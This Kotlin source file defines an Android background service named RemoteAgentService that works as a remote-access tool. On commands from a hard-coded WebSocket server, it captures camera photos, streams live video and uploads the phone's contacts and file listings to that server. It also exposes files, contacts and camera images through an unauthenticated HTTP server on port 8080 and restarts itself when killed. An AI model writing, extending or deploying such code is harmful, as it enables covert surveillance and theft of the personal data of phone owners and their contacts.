package com.example.alex


import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Environment
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import fi.iki.elonen.NanoHTTPD
import fi.iki.elonen.NanoHTTPD.newChunkedResponse
import fi.iki.elonen.NanoHTTPD.newFixedLengthResponse
import java.io.File
import java.io.FileInputStream
import java.net.URLConnection
import java.util.concurrent.CountDownLatch
import android.content.Context
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.provider.ContactsContract
import com.google.gson.Gson
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.net.URI
import android.os.Looper
import okhttp3.OkHttpClient
import java.net.HttpURLConnection
import java.net.URL
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import android.Manifest
import androidx.core.app.ActivityCompat


class RemoteAgentService : Service() {

    private lateinit var server: NanoHTTPD

    private var wsClient: WebSocketClient? = null
    private val deviceId = "android-device-001" // give a unique ID per device


    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        startServer()
        connectWebSocket()
    }

    private var reconnecting = false
    private var isStreaming = false

    private fun connectWebSocket() {

        println("🌐 Trying to connect to WebSocket...")

        try {
            val serverUri = URI("ws://192.168.31.50:3003/ws")
            wsClient = object : WebSocketClient(serverUri) {

                override fun onOpen(handshakedata: ServerHandshake?) {
                    println("✅ Connected to WebSocket server")
                    reconnecting = false

                    val registerMsg = """{"type":"hello","deviceId":"$deviceId"}"""
                    send(registerMsg)

                    // 🔹 Start ping keepalive
                    startPingTimer()

                    // ✅ Delay video start until handshake is definitely acknowledged
//                    Handler(Looper.getMainLooper()).postDelayed({
//                        if (!isStreaming) {
//                            isStreaming = true
//                            handleVideo("front")
//                        }
//                    }, 1000)
                }


                override fun onMessage(message: String?) {
                    if (message == null) return
                    try {
                        val json = JSONObject(message)
                        when (json.optString("type")) {
                            "capture" -> handleCapture(json.optString("which"))
                            "video" -> handleVideo(json.optString("which"))
                            "contacts" -> handleContactsUpload()
                            "files" -> handleFileUpload()
                            "ping" -> wsClient?.send("{\"type\":\"pong\",\"deviceId\":\"$deviceId\"}")
//                            "stop_video" -> stopCamera() // optional stop command
                        }
                    } catch (e: Exception) {
                        println("⚠️ Error parsing message: ${e.message}")
                    }
                }

                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    println("❌ WebSocket closed: $reason")
                    stopStreaming()
                    scheduleReconnect()
                }

                override fun onError(ex: Exception?) {
                    println("⚠️ WebSocket error: ${ex?.message}")
                    stopStreaming()
                    scheduleReconnect()
                }

            }

            wsClient?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
            scheduleReconnect()
        }
    }

    private fun startPingTimer() {
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                try {
                    wsClient?.send("{\"type\":\"ping\",\"deviceId\":\"$deviceId\"}")
                    handler.postDelayed(this, 10000) // every 10s
                } catch (e: Exception) {
                    println("⚠️ Ping failed: ${e.message}")
                }
            }
        }
        handler.postDelayed(runnable, 10000)
    }

    private fun scheduleReconnect() {
        if (reconnecting) return
        reconnecting = true
        println("🔁 Reconnecting WebSocket in 3s…")

        Handler(Looper.getMainLooper()).postDelayed({
            reconnecting = false // ✅ allow next attempt
            connectWebSocket()
        }, 3000)
    }

    private fun stopStreaming() {
        if (isStreaming) {
            println("🛑 stopStreaming called — delegating to stopCameraStreaming()")
            isStreaming = false
            stopCameraStreaming()
        }
    }


//    private fun reconnectWebSocket() {
//        if (reconnecting) return
//        reconnecting = true
//
//        println("♻️ Reconnecting in 3s...")
//        Handler(Looper.getMainLooper()).postDelayed({
//            connectWebSocket()
//        }, 3000)
//    }


    private fun getContactsJson(): String {
        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }
        return Gson().toJson(contactsList)
    }


    private fun handleCapture(which: String) {

        if (which == "stop") {
            stopCameraStreaming()
            return
        }

        val cameraList = when (which) {
            "front" -> listOf(CameraCharacteristics.LENS_FACING_FRONT)
            "back" -> listOf(CameraCharacteristics.LENS_FACING_BACK)
            else -> {
                listOf(CameraCharacteristics.LENS_FACING_BACK)
            }
        }

        Thread {
            for (facing in cameraList) {
                try {
                    val response = captureCameraImage(facing)
                    val bytes = response.data?.readBytes()
                    if (bytes != null) {
                        val whichStr =
                            if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
                        val url = URL("http://192.168.31.50:3003/capture?which=$whichStr")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.doOutput = true
                        conn.setRequestProperty("Content-Type", "image/jpeg")
                        conn.outputStream.use { it.write(bytes) }
                        conn.responseCode
                        conn.disconnect()
                        println("📤 Uploaded $whichStr image")
                    }
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    wsClient?.send("{\"status\":\"upload_failed\",\"error\":\"${ex.message}\"}")
                }
            }
        }.start()
    }

    private fun handleVideo(which: String) {
        val facing = if (which == "front") CameraCharacteristics.LENS_FACING_FRONT
        else CameraCharacteristics.LENS_FACING_BACK
        println("🎥 Starting video stream from ${if (which == "front") "front" else "back"} camera")
        streamCameraVideo(facing)
    }

    private fun handleContactsUpload() {
        val contactsJson = getContactsJson()
        Thread {
            try {
                val url = URL("http://192.168.31.50:3003/contacts")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                val jsonBody = """{"deviceId":"$deviceId","contacts":$contactsJson}"""
                conn.outputStream.use { it.write(jsonBody.toByteArray()) }
                println("📤 Contacts uploaded: ${conn.responseCode}")
                wsClient?.send("{\"status\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")
            } catch (ex: Exception) {
                ex.printStackTrace()
                wsClient?.send("{\"status\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
            }
        }.start()
    }

    private fun handleFileUpload() {
        val baseDir = Environment.getExternalStorageDirectory()
        val files = baseDir.listFiles()?.map {
            mapOf("name" to it.name, "path" to it.absolutePath, "isDir" to it.isDirectory)
        } ?: emptyList()

        val jsonBody = Gson().toJson(mapOf("deviceId" to deviceId, "files" to files))

        Thread {
            try {
                val url = URL("http://192.168.31.50:3003/files")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                conn.outputStream.use { it.write(jsonBody.toByteArray()) }
                conn.responseCode
                println("📂 File list uploaded")
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }.start()
    }











//    ----------------------------------------------------------------------------------



    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // If service is killed by the system, restart it
        return START_STICKY
    }

    // ✅ Add this method
    override fun onTaskRemoved(rootIntent: Intent?) {
        // Restart service if app is swiped away
        val restartServiceIntent = Intent(applicationContext, RemoteAgentService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartServiceIntent)
        } else {
            startService(restartServiceIntent)
        }
        super.onTaskRemoved(rootIntent)
    }

    private fun startServer() {
        server = object : NanoHTTPD(8080) {
            override fun serve(session: IHTTPSession): Response {
                return when {
                    session.uri.startsWith("/files") -> handleFileList(session)
                    session.uri == "/capture/front" -> captureCameraImage(CameraCharacteristics.LENS_FACING_FRONT)
                    session.uri == "/capture/back" -> captureCameraImage(CameraCharacteristics.LENS_FACING_BACK)
//                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
//                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
                    session.uri == "/contacts" -> getContacts()
                    session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                    else -> newFixedLengthResponse(
                        Response.Status.OK,
                        "text/html",
                        """
                        <h3>Remote Agent Active</h3>
                        <ul>
                            <li><a href='/files'>📁 Browse Files</a></li>
                            <li><a href='/contacts'>📸 Contacts</a></li>
                            <li><a href='/capture/front'>🤳 Front Camera</a></li>
                            <li><a href='/capture/back'>📸 Back Camera</a></li>
                             <li><a href='/video/front'>🤳 Front Video Camera</a></li>
                            <li><a href='/video/back'>📸 Back Video Camera</a></li>
                        </ul>
                    """.trimIndent()
                    )
                }
            }
        }
        server.start()
    }

    private fun handleFileList(session: NanoHTTPD.IHTTPSession): NanoHTTPD.Response {
        val baseDir = Environment.getExternalStorageDirectory()
        val relativePath = session.uri.removePrefix("/files").trim('/')
        val target = File(baseDir, relativePath)

        if (!target.exists()) {
            return newFixedLengthResponse(NanoHTTPD.Response.Status.NOT_FOUND, "text/plain", "404 Not Found")
        }

        // If directory → show clickable list
        if (target.isDirectory) {
            val files = target.listFiles()?.sortedBy { !it.isDirectory } ?: emptyList()
            val html = buildString {
                append("<h3>Index of /files/$relativePath</h3><ul>")
                if (relativePath.isNotEmpty()) {
                    val parent = File(relativePath).parent ?: ""
                    append("<li><a href='/files/$parent'>⬅️ Up</a></li>")
                }
                for (file in files) {
                    val name = file.name
                    val href = "/files/" + if (relativePath.isEmpty()) name else "$relativePath/$name"
                    val display = if (file.isDirectory) "📁 $name" else "📄 $name"
                    append("<li><a href='$href'>$display</a></li>")
                }
                append("</ul>")
            }
            return newFixedLengthResponse(NanoHTTPD.Response.Status.OK, "text/html", html)
        }

        // If file → download stream
        val mime = URLConnection.guessContentTypeFromName(target.name) ?: "application/octet-stream"
        val inputStream = FileInputStream(target)
        return newChunkedResponse(NanoHTTPD.Response.Status.OK, mime, inputStream)
    }

    private fun captureCameraImage(lensFacing: Int): NanoHTTPD.Response {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val resultLatch = CountDownLatch(1)
        var imageBytes: ByteArray? = null

        try {
            // Find camera ID
            val cameraId = cameraManager.cameraIdList.first { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
            }

            val reader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
            val handlerThread = HandlerThread("CameraThread").apply { start() }
            val handler = Handler(handlerThread.looper)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(reader.surface)

                    camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            reader.setOnImageAvailableListener({ reader ->
                                val image = reader.acquireLatestImage()
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                image.close()
                                imageBytes = bytes
                                session.close()
                                camera.close()
                                handlerThread.quitSafely()
                                resultLatch.countDown()
                            }, handler)
                            session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            session.close()
                            camera.close()
                            handlerThread.quitSafely()
                            resultLatch.countDown()
                        }
                    }, handler)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }
            }

            try {
                cameraManager.openCamera(cameraId, stateCallback, handler)
            } catch (e: SecurityException) {
                e.printStackTrace()
                return NanoHTTPD.newFixedLengthResponse(
                    NanoHTTPD.Response.Status.FORBIDDEN,
                    "text/plain",
                    "Camera access denied"
                )
            }
            resultLatch.await() // wait for image capture
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return if (imageBytes != null)
            NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.OK,
                "image/jpeg",
                java.io.ByteArrayInputStream(imageBytes),
                imageBytes!!.size.toLong()
            )
        else
            NanoHTTPD.newFixedLengthResponse(NanoHTTPD.Response.Status.INTERNAL_ERROR, "text/plain", "Failed to capture image")
    }


    private var ws: WebSocket? = null
    private var cameraDevice: CameraDevice? = null
    private var handlerThread: HandlerThread? = null
    private var imageReader: ImageReader? = null

    // Track active components for safe stopping
    private var activeCamera: CameraDevice? = null
    private var activeSession: CameraCaptureSession? = null
    private var activeThread: HandlerThread? = null
    private var activeWs: WebSocket? = null
    private var activeLensFacing: Int? = null

    private fun stopCameraStreaming() {
        println("🛑 Stopping camera stream...")

        try {
            // 1) stop repeating on whichever session exists
            try {
                activeSession?.stopRepeating()
            } catch (ise: IllegalStateException) {
                println("⚠️ stopRepeating failed on activeSession: ${ise.message}")
            } catch (e: Exception) {
                println("⚠️ stopRepeating exception on activeSession: ${e.message}")
            }
            try {
                cameraDevice = cameraDevice ?: activeCamera
                // also protect old session variable if you used it directly
                activeSession?.stopRepeating()
            } catch (_: Exception) {}

            // 2) close/clear capture sessions
            try { activeSession?.close() } catch (e: Exception) { println("⚠️ close activeSession: ${e.message}") }
            activeSession = null
            try { /* if you had another 'session' variable, close it too */ } catch (_: Exception) {}

            // 3) remove image listener and close reader
            try { imageReader?.setOnImageAvailableListener(null, null) } catch (_: Exception) {}
            try { imageReader?.close() } catch (e: Exception) { println("⚠️ imageReader close: ${e.message}") }
            imageReader = null

            // 4) close camera devices (both references)
            try { activeCamera?.close() } catch (e: Exception) { println("⚠️ activeCamera close: ${e.message}") }
            activeCamera = null
            try { cameraDevice?.close() } catch (e: Exception) { println("⚠️ cameraDevice close: ${e.message}") }
            cameraDevice = null

            // 5) quit handler threads (both references)
            try { activeThread?.quitSafely() } catch (e: Exception) { println("⚠️ activeThread quit: ${e.message}") }
            activeThread = null
            try { handlerThread?.quitSafely() } catch (e: Exception) { println("⚠️ handlerThread quit: ${e.message}") }
            handlerThread = null

            // 6) close websocket(s)
            try { activeWs?.close(1000, "Stopped") } catch (e: Exception) { println("⚠️ activeWs close: ${e.message}") }
            activeWs = null
            try { ws?.close(1000, "Stopped") } catch (e: Exception) { println("⚠️ ws close: ${e.message}") }
            ws = null

            // 7) clear lens flag
            activeLensFacing = null

            println("✅ Camera stopped cleanly.")
        } catch (e: Exception) {
            println("❌ stopCameraStreaming top-level error: ${e.message}")
        }
    }




    // 🔹 Start streaming video (front/back)
    private fun streamCameraVideo(lensFacing: Int) {
        // Stop any previous stream before starting a new one
        stopCameraStreaming()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            println("❌ Camera permission not granted")
            return
        }

        val wsUrl = "ws://192.168.31.50:3003/ws"
        val client = OkHttpClient()
        val request = Request.Builder().url(wsUrl).build()
        val ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                println("📡 Connected to Node.js WS")
                webSocket.send("""{"type":"video_stream","deviceId":"android-device-001"}""")
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                println("❌ WebSocket failed: ${t.message}")
            }
        })
        activeWs = ws

        val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        val handlerThread = HandlerThread("VideoStreamThread").apply { start() }
        activeThread = handlerThread
        val handler = Handler(handlerThread.looper)

        try {
            val cameraId = cameraManager.cameraIdList.first { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
            }

            val reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    activeCamera = camera

                    try {
                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        request.addTarget(reader.surface)

                        camera.createCaptureSession(
                            listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    activeSession = session

                                    reader.setOnImageAvailableListener({ r ->
                                        val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                                        val buffer = img.planes[0].buffer
                                        val bytes = ByteArray(buffer.remaining())
                                        buffer.get(bytes)
                                        img.close()

                                        try {
                                            activeWs?.send(ByteString.of(*bytes))
                                        } catch (e: Exception) {
                                            println("⚠️ WS send failed: ${e.message}")
                                            stopCameraStreaming()
                                        }
                                    }, handler)

                                    session.setRepeatingRequest(request.build(), null, handler)
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    println("❌ Camera config failed")
                                    stopCameraStreaming()
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        e.printStackTrace()
                        stopCameraStreaming()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    println("⚠️ Camera disconnected")
                    stopCameraStreaming()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    println("❌ Camera error: $error")
                    stopCameraStreaming()
                }
            }

            cameraManager.openCamera(cameraId, stateCallback, handler)

        } catch (e: Exception) {
            e.printStackTrace()
            stopCameraStreaming()
        }
    }







    private fun stopCamera() {
        stopCameraStreaming()
    }




    private fun getContacts(): NanoHTTPD.Response {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            return NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.FORBIDDEN,
                "text/plain",
                "Contacts permission not granted"
            )
        }

        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }

        val json = Gson().toJson(contactsList)
        return NanoHTTPD.newFixedLengthResponse(
            NanoHTTPD.Response.Status.OK,
            "application/json",
            json
        )
    }


    private fun createNotification(): Notification {
        val channelId = "remote_agent_channel"
        val name = "Remote Agent"
        val manager = getSystemService(NotificationManager::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, name, NotificationManager.IMPORTANCE_LOW)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Remote Agent Active")
            .setContentText("Listening for commands on port 8080")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        server.stop()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}